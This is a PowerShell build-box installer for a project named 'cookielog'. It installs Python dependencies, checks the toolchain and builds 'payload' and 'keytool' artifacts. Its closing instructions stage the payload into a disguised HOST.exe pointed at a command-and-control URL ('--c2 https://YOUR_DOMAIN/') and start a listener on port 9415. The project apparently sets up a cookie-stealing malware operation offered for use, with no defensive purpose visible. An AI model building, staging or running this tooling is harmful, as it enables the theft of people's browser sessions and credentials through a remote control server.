# install.ps1 -- build-box setup for cookielog (Windows).
#
# The .bat installers still exist; this one is the short path the build script
# and CI use. It checks the real toolchain (MSVC or clang-cl), installs the
# Python deps, and drives build.py.
#
#   .\install.ps1             deps + build if bin/ is incomplete + verify
#   .\install.ps1 -Build      force a rebuild of payload and keytool
#   .\install.ps1 -NoBuild    deps and checks only
#   .\install.ps1 -Check      install nothing, just report
#
# Run from the cookielog directory.
[CmdletBinding()]
param(
    [switch]$Check,
    [switch]$Build,
    [switch]$NoBuild
)

$ErrorActionPreference = "Stop"
Set-Location -LiteralPath $PSScriptRoot

function Section([string]$Text) {
    Write-Host ""
    Write-Host "== $Text ==" -ForegroundColor Cyan
    Write-Host ("-" * 70)
}

function Have([string]$Name) {
    return [bool](Get-Command $Name -ErrorAction SilentlyContinue)
}

Section "[1/4] python"
$python = Get-Command python -ErrorAction SilentlyContinue
if (-not $python) {
    Write-Host "[-] python not on PATH"
    if ($Check) { exit 1 }
    if (-not (Have winget)) {
        Write-Host "[-] winget missing too; install Python 3.8+ from python.org"
        exit 1
    }
    Write-Host "[*] installing Python 3.12 via winget..."
    winget install --id Python.Python.3.12 -e --silent `
        --accept-source-agreements --accept-package-agreements
    Write-Host "[*] re-run this script in a new shell (PATH changed)"
    exit 0
}
$pyver = & python -c "import sys; print('%d.%d.%d' % sys.version_info[:3])"
Write-Host "[+] python $pyver"

if ($Check) {
    & python build.py check
    exit $LASTEXITCODE
}

Section "[2/4] python deps"
& python -m pip install --disable-pip-version-check -r requirements.txt
if ($LASTEXITCODE -ne 0) {
    Write-Host "[-] pip install failed"
    exit 1
}
Write-Host "[+] deps installed"

Section "[3/4] toolchain"
& python build.py check
$checkExit = $LASTEXITCODE
if ($checkExit -ne 0) {
    Write-Host "[-] payload artifacts incomplete"
    if ($NoBuild) { exit 1 }
}

Section "[4/4] build"
$needBuild = $Build
if (-not $NoBuild -and -not $needBuild) {
    if ($checkExit -ne 0) { $needBuild = $true }
}
if ($NoBuild) {
    Write-Host "[*] skipping build (-NoBuild)"
} elseif ($needBuild) {
    & python build.py all
    if ($LASTEXITCODE -ne 0) { exit 1 }
} else {
    Write-Host "[+] artifacts already complete (use -Build to rebuild)"
}

Write-Host ""
Write-Host "== done ==" -ForegroundColor Cyan
& python build.py hash
Write-Host ""
Write-Host "next:"
Write-Host "  python build.py stage HOST.exe --c2 https://YOUR_DOMAIN/"
Write-Host "  python listen.py 9415"
